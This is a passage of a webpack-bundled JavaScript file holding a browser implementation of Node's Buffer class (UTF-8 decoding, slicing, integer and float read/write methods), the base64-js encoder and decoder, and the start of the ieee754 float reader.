	              codePoint = tempCodePoint
	            }
	          }
	          break
	        case 4:
	          secondByte = buf[i + 1]
	          thirdByte = buf[i + 2]
	          fourthByte = buf[i + 3]
	          if ((secondByte & 0xC0) === 0x80 && (thirdByte & 0xC0) === 0x80 && (fourthByte & 0xC0) === 0x80) {
	            tempCodePoint = (firstByte & 0xF) << 0x12 | (secondByte & 0x3F) << 0xC | (thirdByte & 0x3F) << 0x6 | (fourthByte & 0x3F)
	            if (tempCodePoint > 0xFFFF && tempCodePoint < 0x110000) {
	              codePoint = tempCodePoint
	            }
	          }
	      }
	    }

	    if (codePoint === null) {
	      // we did not generate a valid codePoint so insert a
	      // replacement char (U+FFFD) and advance only 1 byte
	      codePoint = 0xFFFD
	      bytesPerSequence = 1
	    } else if (codePoint > 0xFFFF) {
	      // encode to utf16 (surrogate pair dance)
	      codePoint -= 0x10000
	      res.push(codePoint >>> 10 & 0x3FF | 0xD800)
	      codePoint = 0xDC00 | codePoint & 0x3FF
	    }

	    res.push(codePoint)
	    i += bytesPerSequence
	  }

	  return decodeCodePointsArray(res)
	}

	// Based on http://stackoverflow.com/a/22747272/680742, the browser with
	// the lowest limit is Chrome, with 0x10000 args.
	// We go 1 magnitude less, for safety
	var MAX_ARGUMENTS_LENGTH = 0x1000

	function decodeCodePointsArray (codePoints) {
	  var len = codePoints.length
	  if (len <= MAX_ARGUMENTS_LENGTH) {
	    return String.fromCharCode.apply(String, codePoints) // avoid extra slice()
	  }

	  // Decode in chunks to avoid "call stack size exceeded".
	  var res = ''
	  var i = 0
	  while (i < len) {
	    res += String.fromCharCode.apply(
	      String,
	      codePoints.slice(i, i += MAX_ARGUMENTS_LENGTH)
	    )
	  }
	  return res
	}

	function asciiSlice (buf, start, end) {
	  var ret = ''
	  end = Math.min(buf.length, end)

	  for (var i = start; i < end; i++) {
	    ret += String.fromCharCode(buf[i] & 0x7F)
	  }
	  return ret
	}

	function binarySlice (buf, start, end) {
	  var ret = ''
	  end = Math.min(buf.length, end)

	  for (var i = start; i < end; i++) {
	    ret += String.fromCharCode(buf[i])
	  }
	  return ret
	}

	function hexSlice (buf, start, end) {
	  var len = buf.length

	  if (!start || start < 0) start = 0
	  if (!end || end < 0 || end > len) end = len

	  var out = ''
	  for (var i = start; i < end; i++) {
	    out += toHex(buf[i])
	  }
	  return out
	}

	function utf16leSlice (buf, start, end) {
	  var bytes = buf.slice(start, end)
	  var res = ''
	  for (var i = 0; i < bytes.length; i += 2) {
	    res += String.fromCharCode(bytes[i] + bytes[i + 1] * 256)
	  }
	  return res
	}

	Buffer.prototype.slice = function slice (start, end) {
	  var len = this.length
	  start = ~~start
	  end = end === undefined ? len : ~~end

	  if (start < 0) {
	    start += len
	    if (start < 0) start = 0
	  } else if (start > len) {
	    start = len
	  }

	  if (end < 0) {
	    end += len
	    if (end < 0) end = 0
	  } else if (end > len) {
	    end = len
	  }

	  if (end < start) end = start

	  var newBuf
	  if (Buffer.TYPED_ARRAY_SUPPORT) {
	    newBuf = Buffer._augment(this.subarray(start, end))
	  } else {
	    var sliceLen = end - start
	    newBuf = new Buffer(sliceLen, undefined)
	    for (var i = 0; i < sliceLen; i++) {
	      newBuf[i] = this[i + start]
	    }
	  }

	  if (newBuf.length) newBuf.parent = this.parent || this

	  return newBuf
	}

	/*
	 * Need to make sure that buffer isn't trying to write out of bounds.
	 */
	function checkOffset (offset, ext, length) {
	  if ((offset % 1) !== 0 || offset < 0) throw new RangeError('offset is not uint')
	  if (offset + ext > length) throw new RangeError('Trying to access beyond buffer length')
	}

	Buffer.prototype.readUIntLE = function readUIntLE (offset, byteLength, noAssert) {
	  offset = offset | 0
	  byteLength = byteLength | 0
	  if (!noAssert) checkOffset(offset, byteLength, this.length)

	  var val = this[offset]
	  var mul = 1
	  var i = 0
	  while (++i < byteLength && (mul *= 0x100)) {
	    val += this[offset + i] * mul
	  }

	  return val
	}

	Buffer.prototype.readUIntBE = function readUIntBE (offset, byteLength, noAssert) {
	  offset = offset | 0
	  byteLength = byteLength | 0
	  if (!noAssert) {
	    checkOffset(offset, byteLength, this.length)
	  }

	  var val = this[offset + --byteLength]
	  var mul = 1
	  while (byteLength > 0 && (mul *= 0x100)) {
	    val += this[offset + --byteLength] * mul
	  }

	  return val
	}

	Buffer.prototype.readUInt8 = function readUInt8 (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 1, this.length)
	  return this[offset]
	}

	Buffer.prototype.readUInt16LE = function readUInt16LE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 2, this.length)
	  return this[offset] | (this[offset + 1] << 8)
	}

	Buffer.prototype.readUInt16BE = function readUInt16BE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 2, this.length)
	  return (this[offset] << 8) | this[offset + 1]
	}

	Buffer.prototype.readUInt32LE = function readUInt32LE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 4, this.length)

	  return ((this[offset]) |
	      (this[offset + 1] << 8) |
	      (this[offset + 2] << 16)) +
	      (this[offset + 3] * 0x1000000)
	}

	Buffer.prototype.readUInt32BE = function readUInt32BE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 4, this.length)

	  return (this[offset] * 0x1000000) +
	    ((this[offset + 1] << 16) |
	    (this[offset + 2] << 8) |
	    this[offset + 3])
	}

	Buffer.prototype.readIntLE = function readIntLE (offset, byteLength, noAssert) {
	  offset = offset | 0
	  byteLength = byteLength | 0
	  if (!noAssert) checkOffset(offset, byteLength, this.length)

	  var val = this[offset]
	  var mul = 1
	  var i = 0
	  while (++i < byteLength && (mul *= 0x100)) {
	    val += this[offset + i] * mul
	  }
	  mul *= 0x80

	  if (val >= mul) val -= Math.pow(2, 8 * byteLength)

	  return val
	}

	Buffer.prototype.readIntBE = function readIntBE (offset, byteLength, noAssert) {
	  offset = offset | 0
	  byteLength = byteLength | 0
	  if (!noAssert) checkOffset(offset, byteLength, this.length)

	  var i = byteLength
	  var mul = 1
	  var val = this[offset + --i]
	  while (i > 0 && (mul *= 0x100)) {
	    val += this[offset + --i] * mul
	  }
	  mul *= 0x80

	  if (val >= mul) val -= Math.pow(2, 8 * byteLength)

	  return val
	}

	Buffer.prototype.readInt8 = function readInt8 (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 1, this.length)
	  if (!(this[offset] & 0x80)) return (this[offset])
	  return ((0xff - this[offset] + 1) * -1)
	}

	Buffer.prototype.readInt16LE = function readInt16LE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 2, this.length)
	  var val = this[offset] | (this[offset + 1] << 8)
	  return (val & 0x8000) ? val | 0xFFFF0000 : val
	}

	Buffer.prototype.readInt16BE = function readInt16BE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 2, this.length)
	  var val = this[offset + 1] | (this[offset] << 8)
	  return (val & 0x8000) ? val | 0xFFFF0000 : val
	}

	Buffer.prototype.readInt32LE = function readInt32LE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 4, this.length)

	  return (this[offset]) |
	    (this[offset + 1] << 8) |
	    (this[offset + 2] << 16) |
	    (this[offset + 3] << 24)
	}

	Buffer.prototype.readInt32BE = function readInt32BE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 4, this.length)

	  return (this[offset] << 24) |
	    (this[offset + 1] << 16) |
	    (this[offset + 2] << 8) |
	    (this[offset + 3])
	}

	Buffer.prototype.readFloatLE = function readFloatLE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 4, this.length)
	  return ieee754.read(this, offset, true, 23, 4)
	}

	Buffer.prototype.readFloatBE = function readFloatBE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 4, this.length)
	  return ieee754.read(this, offset, false, 23, 4)
	}

	Buffer.prototype.readDoubleLE = function readDoubleLE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 8, this.length)
	  return ieee754.read(this, offset, true, 52, 8)
	}

	Buffer.prototype.readDoubleBE = function readDoubleBE (offset, noAssert) {
	  if (!noAssert) checkOffset(offset, 8, this.length)
	  return ieee754.read(this, offset, false, 52, 8)
	}

	function checkInt (buf, value, offset, ext, max, min) {
	  if (!Buffer.isBuffer(buf)) throw new TypeError('buffer must be a Buffer instance')
	  if (value > max || value < min) throw new RangeError('value is out of bounds')
	  if (offset + ext > buf.length) throw new RangeError('index out of range')
	}

	Buffer.prototype.writeUIntLE = function writeUIntLE (value, offset, byteLength, noAssert) {
	  value = +value
	  offset = offset | 0
	  byteLength = byteLength | 0
	  if (!noAssert) checkInt(this, value, offset, byteLength, Math.pow(2, 8 * byteLength), 0)

	  var mul = 1
	  var i = 0
	  this[offset] = value & 0xFF
	  while (++i < byteLength && (mul *= 0x100)) {
	    this[offset + i] = (value / mul) & 0xFF
	  }

	  return offset + byteLength
	}

	Buffer.prototype.writeUIntBE = function writeUIntBE (value, offset, byteLength, noAssert) {
	  value = +value
	  offset = offset | 0
	  byteLength = byteLength | 0
	  if (!noAssert) checkInt(this, value, offset, byteLength, Math.pow(2, 8 * byteLength), 0)

	  var i = byteLength - 1
	  var mul = 1
	  this[offset + i] = value & 0xFF
	  while (--i >= 0 && (mul *= 0x100)) {
	    this[offset + i] = (value / mul) & 0xFF
	  }

	  return offset + byteLength
	}

	Buffer.prototype.writeUInt8 = function writeUInt8 (value, offset, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) checkInt(this, value, offset, 1, 0xff, 0)
	  if (!Buffer.TYPED_ARRAY_SUPPORT) value = Math.floor(value)
	  this[offset] = (value & 0xff)
	  return offset + 1
	}

	function objectWriteUInt16 (buf, value, offset, littleEndian) {
	  if (value < 0) value = 0xffff + value + 1
	  for (var i = 0, j = Math.min(buf.length - offset, 2); i < j; i++) {
	    buf[offset + i] = (value & (0xff << (8 * (littleEndian ? i : 1 - i)))) >>>
	      (littleEndian ? i : 1 - i) * 8
	  }
	}

	Buffer.prototype.writeUInt16LE = function writeUInt16LE (value, offset, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) checkInt(this, value, offset, 2, 0xffff, 0)
	  if (Buffer.TYPED_ARRAY_SUPPORT) {
	    this[offset] = (value & 0xff)
	    this[offset + 1] = (value >>> 8)
	  } else {
	    objectWriteUInt16(this, value, offset, true)
	  }
	  return offset + 2
	}

	Buffer.prototype.writeUInt16BE = function writeUInt16BE (value, offset, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) checkInt(this, value, offset, 2, 0xffff, 0)
	  if (Buffer.TYPED_ARRAY_SUPPORT) {
	    this[offset] = (value >>> 8)
	    this[offset + 1] = (value & 0xff)
	  } else {
	    objectWriteUInt16(this, value, offset, false)
	  }
	  return offset + 2
	}

	function objectWriteUInt32 (buf, value, offset, littleEndian) {
	  if (value < 0) value = 0xffffffff + value + 1
	  for (var i = 0, j = Math.min(buf.length - offset, 4); i < j; i++) {
	    buf[offset + i] = (value >>> (littleEndian ? i : 3 - i) * 8) & 0xff
	  }
	}

	Buffer.prototype.writeUInt32LE = function writeUInt32LE (value, offset, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) checkInt(this, value, offset, 4, 0xffffffff, 0)
	  if (Buffer.TYPED_ARRAY_SUPPORT) {
	    this[offset + 3] = (value >>> 24)
	    this[offset + 2] = (value >>> 16)
	    this[offset + 1] = (value >>> 8)
	    this[offset] = (value & 0xff)
	  } else {
	    objectWriteUInt32(this, value, offset, true)
	  }
	  return offset + 4
	}

	Buffer.prototype.writeUInt32BE = function writeUInt32BE (value, offset, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) checkInt(this, value, offset, 4, 0xffffffff, 0)
	  if (Buffer.TYPED_ARRAY_SUPPORT) {
	    this[offset] = (value >>> 24)
	    this[offset + 1] = (value >>> 16)
	    this[offset + 2] = (value >>> 8)
	    this[offset + 3] = (value & 0xff)
	  } else {
	    objectWriteUInt32(this, value, offset, false)
	  }
	  return offset + 4
	}

	Buffer.prototype.writeIntLE = function writeIntLE (value, offset, byteLength, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) {
	    var limit = Math.pow(2, 8 * byteLength - 1)

	    checkInt(this, value, offset, byteLength, limit - 1, -limit)
	  }

	  var i = 0
	  var mul = 1
	  var sub = value < 0 ? 1 : 0
	  this[offset] = value & 0xFF
	  while (++i < byteLength && (mul *= 0x100)) {
	    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
	  }

	  return offset + byteLength
	}

	Buffer.prototype.writeIntBE = function writeIntBE (value, offset, byteLength, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) {
	    var limit = Math.pow(2, 8 * byteLength - 1)

	    checkInt(this, value, offset, byteLength, limit - 1, -limit)
	  }

	  var i = byteLength - 1
	  var mul = 1
	  var sub = value < 0 ? 1 : 0
	  this[offset + i] = value & 0xFF
	  while (--i >= 0 && (mul *= 0x100)) {
	    this[offset + i] = ((value / mul) >> 0) - sub & 0xFF
	  }

	  return offset + byteLength
	}

	Buffer.prototype.writeInt8 = function writeInt8 (value, offset, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) checkInt(this, value, offset, 1, 0x7f, -0x80)
	  if (!Buffer.TYPED_ARRAY_SUPPORT) value = Math.floor(value)
	  if (value < 0) value = 0xff + value + 1
	  this[offset] = (value & 0xff)
	  return offset + 1
	}

	Buffer.prototype.writeInt16LE = function writeInt16LE (value, offset, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) checkInt(this, value, offset, 2, 0x7fff, -0x8000)
	  if (Buffer.TYPED_ARRAY_SUPPORT) {
	    this[offset] = (value & 0xff)
	    this[offset + 1] = (value >>> 8)
	  } else {
	    objectWriteUInt16(this, value, offset, true)
	  }
	  return offset + 2
	}

	Buffer.prototype.writeInt16BE = function writeInt16BE (value, offset, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) checkInt(this, value, offset, 2, 0x7fff, -0x8000)
	  if (Buffer.TYPED_ARRAY_SUPPORT) {
	    this[offset] = (value >>> 8)
	    this[offset + 1] = (value & 0xff)
	  } else {
	    objectWriteUInt16(this, value, offset, false)
	  }
	  return offset + 2
	}

	Buffer.prototype.writeInt32LE = function writeInt32LE (value, offset, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)
	  if (Buffer.TYPED_ARRAY_SUPPORT) {
	    this[offset] = (value & 0xff)
	    this[offset + 1] = (value >>> 8)
	    this[offset + 2] = (value >>> 16)
	    this[offset + 3] = (value >>> 24)
	  } else {
	    objectWriteUInt32(this, value, offset, true)
	  }
	  return offset + 4
	}

	Buffer.prototype.writeInt32BE = function writeInt32BE (value, offset, noAssert) {
	  value = +value
	  offset = offset | 0
	  if (!noAssert) checkInt(this, value, offset, 4, 0x7fffffff, -0x80000000)
	  if (value < 0) value = 0xffffffff + value + 1
	  if (Buffer.TYPED_ARRAY_SUPPORT) {
	    this[offset] = (value >>> 24)
	    this[offset + 1] = (value >>> 16)
	    this[offset + 2] = (value >>> 8)
	    this[offset + 3] = (value & 0xff)
	  } else {
	    objectWriteUInt32(this, value, offset, false)
	  }
	  return offset + 4
	}

	function checkIEEE754 (buf, value, offset, ext, max, min) {
	  if (value > max || value < min) throw new RangeError('value is out of bounds')
	  if (offset + ext > buf.length) throw new RangeError('index out of range')
	  if (offset < 0) throw new RangeError('index out of range')
	}

	function writeFloat (buf, value, offset, littleEndian, noAssert) {
	  if (!noAssert) {
	    checkIEEE754(buf, value, offset, 4, 3.4028234663852886e+38, -3.4028234663852886e+38)
	  }
	  ieee754.write(buf, value, offset, littleEndian, 23, 4)
	  return offset + 4
	}

	Buffer.prototype.writeFloatLE = function writeFloatLE (value, offset, noAssert) {
	  return writeFloat(this, value, offset, true, noAssert)
	}

	Buffer.prototype.writeFloatBE = function writeFloatBE (value, offset, noAssert) {
	  return writeFloat(this, value, offset, false, noAssert)
	}

	function writeDouble (buf, value, offset, littleEndian, noAssert) {
	  if (!noAssert) {
	    checkIEEE754(buf, value, offset, 8, 1.7976931348623157E+308, -1.7976931348623157E+308)
	  }
	  ieee754.write(buf, value, offset, littleEndian, 52, 8)
	  return offset + 8
	}

	Buffer.prototype.writeDoubleLE = function writeDoubleLE (value, offset, noAssert) {
	  return writeDouble(this, value, offset, true, noAssert)
	}

	Buffer.prototype.writeDoubleBE = function writeDoubleBE (value, offset, noAssert) {
	  return writeDouble(this, value, offset, false, noAssert)
	}

	// copy(targetBuffer, targetStart=0, sourceStart=0, sourceEnd=buffer.length)
	Buffer.prototype.copy = function copy (target, targetStart, start, end) {
	  if (!start) start = 0
	  if (!end && end !== 0) end = this.length
	  if (targetStart >= target.length) targetStart = target.length
	  if (!targetStart) targetStart = 0
	  if (end > 0 && end < start) end = start

	  // Copy 0 bytes; we're done
	  if (end === start) return 0
	  if (target.length === 0 || this.length === 0) return 0

	  // Fatal error conditions
	  if (targetStart < 0) {
	    throw new RangeError('targetStart out of bounds')
	  }
	  if (start < 0 || start >= this.length) throw new RangeError('sourceStart out of bounds')
	  if (end < 0) throw new RangeError('sourceEnd out of bounds')

	  // Are we oob?
	  if (end > this.length) end = this.length
	  if (target.length - targetStart < end - start) {
	    end = target.length - targetStart + start
	  }

	  var len = end - start
	  var i

	  if (this === target && start < targetStart && targetStart < end) {
	    // descending copy from end
	    for (i = len - 1; i >= 0; i--) {
	      target[i + targetStart] = this[i + start]
	    }
	  } else if (len < 1000 || !Buffer.TYPED_ARRAY_SUPPORT) {
	    // ascending copy from start
	    for (i = 0; i < len; i++) {
	      target[i + targetStart] = this[i + start]
	    }
	  } else {
	    target._set(this.subarray(start, start + len), targetStart)
	  }

	  return len
	}

	// fill(value, start=0, end=buffer.length)
	Buffer.prototype.fill = function fill (value, start, end) {
	  if (!value) value = 0
	  if (!start) start = 0
	  if (!end) end = this.length

	  if (end < start) throw new RangeError('end < start')

	  // Fill 0 bytes; we're done
	  if (end === start) return
	  if (this.length === 0) return

	  if (start < 0 || start >= this.length) throw new RangeError('start out of bounds')
	  if (end < 0 || end > this.length) throw new RangeError('end out of bounds')

	  var i
	  if (typeof value === 'number') {
	    for (i = start; i < end; i++) {
	      this[i] = value
	    }
	  } else {
	    var bytes = utf8ToBytes(value.toString())
	    var len = bytes.length
	    for (i = start; i < end; i++) {
	      this[i] = bytes[i % len]
	    }
	  }

	  return this
	}

	/**
	 * Creates a new `ArrayBuffer` with the *copied* memory of the buffer instance.
	 * Added in Node 0.12. Only available in browsers that support ArrayBuffer.
	 */
	Buffer.prototype.toArrayBuffer = function toArrayBuffer () {
	  if (typeof Uint8Array !== 'undefined') {
	    if (Buffer.TYPED_ARRAY_SUPPORT) {
	      return (new Buffer(this)).buffer
	    } else {
	      var buf = new Uint8Array(this.length)
	      for (var i = 0, len = buf.length; i < len; i += 1) {
	        buf[i] = this[i]
	      }
	      return buf.buffer
	    }
	  } else {
	    throw new TypeError('Buffer.toArrayBuffer not supported in this browser')
	  }
	}

	// HELPER FUNCTIONS
	// ================

	var BP = Buffer.prototype

	/**
	 * Augment a Uint8Array *instance* (not the Uint8Array class!) with Buffer methods
	 */
	Buffer._augment = function _augment (arr) {
	  arr.constructor = Buffer
	  arr._isBuffer = true

	  // save reference to original Uint8Array set method before overwriting
	  arr._set = arr.set

	  // deprecated
	  arr.get = BP.get
	  arr.set = BP.set

	  arr.write = BP.write
	  arr.toString = BP.toString
	  arr.toLocaleString = BP.toString
	  arr.toJSON = BP.toJSON
	  arr.equals = BP.equals
	  arr.compare = BP.compare
	  arr.indexOf = BP.indexOf
	  arr.copy = BP.copy
	  arr.slice = BP.slice
	  arr.readUIntLE = BP.readUIntLE
	  arr.readUIntBE = BP.readUIntBE
	  arr.readUInt8 = BP.readUInt8
	  arr.readUInt16LE = BP.readUInt16LE
	  arr.readUInt16BE = BP.readUInt16BE
	  arr.readUInt32LE = BP.readUInt32LE
	  arr.readUInt32BE = BP.readUInt32BE
	  arr.readIntLE = BP.readIntLE
	  arr.readIntBE = BP.readIntBE
	  arr.readInt8 = BP.readInt8
	  arr.readInt16LE = BP.readInt16LE
	  arr.readInt16BE = BP.readInt16BE
	  arr.readInt32LE = BP.readInt32LE
	  arr.readInt32BE = BP.readInt32BE
	  arr.readFloatLE = BP.readFloatLE
	  arr.readFloatBE = BP.readFloatBE
	  arr.readDoubleLE = BP.readDoubleLE
	  arr.readDoubleBE = BP.readDoubleBE
	  arr.writeUInt8 = BP.writeUInt8
	  arr.writeUIntLE = BP.writeUIntLE
	  arr.writeUIntBE = BP.writeUIntBE
	  arr.writeUInt16LE = BP.writeUInt16LE
	  arr.writeUInt16BE = BP.writeUInt16BE
	  arr.writeUInt32LE = BP.writeUInt32LE
	  arr.writeUInt32BE = BP.writeUInt32BE
	  arr.writeIntLE = BP.writeIntLE
	  arr.writeIntBE = BP.writeIntBE
	  arr.writeInt8 = BP.writeInt8
	  arr.writeInt16LE = BP.writeInt16LE
	  arr.writeInt16BE = BP.writeInt16BE
	  arr.writeInt32LE = BP.writeInt32LE
	  arr.writeInt32BE = BP.writeInt32BE
	  arr.writeFloatLE = BP.writeFloatLE
	  arr.writeFloatBE = BP.writeFloatBE
	  arr.writeDoubleLE = BP.writeDoubleLE
	  arr.writeDoubleBE = BP.writeDoubleBE
	  arr.fill = BP.fill
	  arr.inspect = BP.inspect
	  arr.toArrayBuffer = BP.toArrayBuffer

	  return arr
	}

	var INVALID_BASE64_RE = /[^+\/0-9A-Za-z-_]/g

	function base64clean (str) {
	  // Node strips out invalid characters like \n and \t from the string, base64-js does not
	  str = stringtrim(str).replace(INVALID_BASE64_RE, '')
	  // Node converts strings with length < 2 to ''
	  if (str.length < 2) return ''
	  // Node allows for non-padded base64 strings (missing trailing ===), base64-js does not
	  while (str.length % 4 !== 0) {
	    str = str + '='
	  }
	  return str
	}

	function stringtrim (str) {
	  if (str.trim) return str.trim()
	  return str.replace(/^\s+|\s+$/g, '')
	}

	function toHex (n) {
	  if (n < 16) return '0' + n.toString(16)
	  return n.toString(16)
	}

	function utf8ToBytes (string, units) {
	  units = units || Infinity
	  var codePoint
	  var length = string.length
	  var leadSurrogate = null
	  var bytes = []

	  for (var i = 0; i < length; i++) {
	    codePoint = string.charCodeAt(i)

	    // is surrogate component
	    if (codePoint > 0xD7FF && codePoint < 0xE000) {
	      // last char was a lead
	      if (!leadSurrogate) {
	        // no lead yet
	        if (codePoint > 0xDBFF) {
	          // unexpected trail
	          if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)
	          continue
	        } else if (i + 1 === length) {
	          // unpaired lead
	          if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)
	          continue
	        }

	        // valid lead
	        leadSurrogate = codePoint

	        continue
	      }

	      // 2 leads in a row
	      if (codePoint < 0xDC00) {
	        if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)
	        leadSurrogate = codePoint
	        continue
	      }

	      // valid surrogate pair
	      codePoint = (leadSurrogate - 0xD800 << 10 | codePoint - 0xDC00) + 0x10000
	    } else if (leadSurrogate) {
	      // valid bmp char, but last char was a lead
	      if ((units -= 3) > -1) bytes.push(0xEF, 0xBF, 0xBD)
	    }

	    leadSurrogate = null

	    // encode utf8
	    if (codePoint < 0x80) {
	      if ((units -= 1) < 0) break
	      bytes.push(codePoint)
	    } else if (codePoint < 0x800) {
	      if ((units -= 2) < 0) break
	      bytes.push(
	        codePoint >> 0x6 | 0xC0,
	        codePoint & 0x3F | 0x80
	      )
	    } else if (codePoint < 0x10000) {
	      if ((units -= 3) < 0) break
	      bytes.push(
	        codePoint >> 0xC | 0xE0,
	        codePoint >> 0x6 & 0x3F | 0x80,
	        codePoint & 0x3F | 0x80
	      )
	    } else if (codePoint < 0x110000) {
	      if ((units -= 4) < 0) break
	      bytes.push(
	        codePoint >> 0x12 | 0xF0,
	        codePoint >> 0xC & 0x3F | 0x80,
	        codePoint >> 0x6 & 0x3F | 0x80,
	        codePoint & 0x3F | 0x80
	      )
	    } else {
	      throw new Error('Invalid code point')
	    }
	  }

	  return bytes
	}

	function asciiToBytes (str) {
	  var byteArray = []
	  for (var i = 0; i < str.length; i++) {
	    // Node's code seems to be doing this and not & 0x7F..
	    byteArray.push(str.charCodeAt(i) & 0xFF)
	  }
	  return byteArray
	}

	function utf16leToBytes (str, units) {
	  var c, hi, lo
	  var byteArray = []
	  for (var i = 0; i < str.length; i++) {
	    if ((units -= 2) < 0) break

	    c = str.charCodeAt(i)
	    hi = c >> 8
	    lo = c % 256
	    byteArray.push(lo)
	    byteArray.push(hi)
	  }

	  return byteArray
	}

	function base64ToBytes (str) {
	  return base64.toByteArray(base64clean(str))
	}

	function blitBuffer (src, dst, offset, length) {
	  for (var i = 0; i < length; i++) {
	    if ((i + offset >= dst.length) || (i >= src.length)) break
	    dst[i + offset] = src[i]
	  }
	  return i
	}

	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(5).Buffer, (function() { return this; }())))

/***/ },
/* 6 */
/***/ function(module, exports, __webpack_require__) {

	var lookup = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

	;(function (exports) {
		'use strict';

	  var Arr = (typeof Uint8Array !== 'undefined')
	    ? Uint8Array
	    : Array

		var PLUS   = '+'.charCodeAt(0)
		var SLASH  = '/'.charCodeAt(0)
		var NUMBER = '0'.charCodeAt(0)
		var LOWER  = 'a'.charCodeAt(0)
		var UPPER  = 'A'.charCodeAt(0)
		var PLUS_URL_SAFE = '-'.charCodeAt(0)
		var SLASH_URL_SAFE = '_'.charCodeAt(0)

		function decode (elt) {
			var code = elt.charCodeAt(0)
			if (code === PLUS ||
			    code === PLUS_URL_SAFE)
				return 62 // '+'
			if (code === SLASH ||
			    code === SLASH_URL_SAFE)
				return 63 // '/'
			if (code < NUMBER)
				return -1 //no match
			if (code < NUMBER + 10)
				return code - NUMBER + 26 + 26
			if (code < UPPER + 26)
				return code - UPPER
			if (code < LOWER + 26)
				return code - LOWER + 26
		}

		function b64ToByteArray (b64) {
			var i, j, l, tmp, placeHolders, arr

			if (b64.length % 4 > 0) {
				throw new Error('Invalid string. Length must be a multiple of 4')
			}

			// the number of equal signs (place holders)
			// if there are two placeholders, than the two characters before it
			// represent one byte
			// if there is only one, then the three characters before it represent 2 bytes
			// this is just a cheap hack to not do indexOf twice
			var len = b64.length
			placeHolders = '=' === b64.charAt(len - 2) ? 2 : '=' === b64.charAt(len - 1) ? 1 : 0

			// base64 is 4/3 + up to two characters of the original data
			arr = new Arr(b64.length * 3 / 4 - placeHolders)

			// if there are placeholders, only get up to the last complete 4 chars
			l = placeHolders > 0 ? b64.length - 4 : b64.length

			var L = 0

			function push (v) {
				arr[L++] = v
			}

			for (i = 0, j = 0; i < l; i += 4, j += 3) {
				tmp = (decode(b64.charAt(i)) << 18) | (decode(b64.charAt(i + 1)) << 12) | (decode(b64.charAt(i + 2)) << 6) | decode(b64.charAt(i + 3))
				push((tmp & 0xFF0000) >> 16)
				push((tmp & 0xFF00) >> 8)
				push(tmp & 0xFF)
			}

			if (placeHolders === 2) {
				tmp = (decode(b64.charAt(i)) << 2) | (decode(b64.charAt(i + 1)) >> 4)
				push(tmp & 0xFF)
			} else if (placeHolders === 1) {
				tmp = (decode(b64.charAt(i)) << 10) | (decode(b64.charAt(i + 1)) << 4) | (decode(b64.charAt(i + 2)) >> 2)
				push((tmp >> 8) & 0xFF)
				push(tmp & 0xFF)
			}

			return arr
		}

		function uint8ToBase64 (uint8) {
			var i,
				extraBytes = uint8.length % 3, // if we have 1 byte left, pad 2 bytes
				output = "",
				temp, length

			function encode (num) {
				return lookup.charAt(num)
			}

			function tripletToBase64 (num) {
				return encode(num >> 18 & 0x3F) + encode(num >> 12 & 0x3F) + encode(num >> 6 & 0x3F) + encode(num & 0x3F)
			}

			// go through the array every three bytes, we'll deal with trailing stuff later
			for (i = 0, length = uint8.length - extraBytes; i < length; i += 3) {
				temp = (uint8[i] << 16) + (uint8[i + 1] << 8) + (uint8[i + 2])
				output += tripletToBase64(temp)
			}

			// pad the end with zeros, but make sure to not forget the extra bytes
			switch (extraBytes) {
				case 1:
					temp = uint8[uint8.length - 1]
					output += encode(temp >> 2)
					output += encode((temp << 4) & 0x3F)
					output += '=='
					break
				case 2:
					temp = (uint8[uint8.length - 2] << 8) + (uint8[uint8.length - 1])
					output += encode(temp >> 10)
					output += encode((temp >> 4) & 0x3F)
					output += encode((temp << 2) & 0x3F)
					output += '='
					break
			}

			return output
		}

		exports.toByteArray = b64ToByteArray
		exports.fromByteArray = uint8ToBase64
	}( false ? (this.base64js = {}) : exports))


/***/ },
/* 7 */
/***/ function(module, exports) {

	exports.read = function (buffer, offset, isLE, mLen, nBytes) {
	  var e, m
	  var eLen = nBytes * 8 - mLen - 1
	  var eMax = (1 << eLen) - 1
	  var eBias = eMax >> 1
	  var nBits = -7
	  var i = isLE ? (nBytes - 1) : 0
	  var d = isLE ? -1 : 1
	  var s = buffer[offset + i]

	  i += d

	  e = s & ((1 << (-nBits)) - 1)
	  s >>= (-nBits)
	  nBits += eLen
	  for (; nBits > 0; e = e * 256 + buffer[offset + i], i += d, nBits -= 8) {}

	  m = e & ((1 << (-nBits)) - 1)
	  e >>= (-nBits)
	  nBits += mLen
	  for (; nBits > 0; m = m * 256 + buffer[offset + i], i += d, nBits -= 8) {}

	  if (e === 0) {
	    e = 1 - eBias
	  } else if (e === eMax) {
	    return m ? NaN : ((s ? -1 : 1) * Infinity)
	  } else {
	    m = m + Math.pow(2, mLen)
	    e = e - eBias
	  }
	  return (s ? -1 : 1) * m * Math.pow(2, e - mLen)
	}

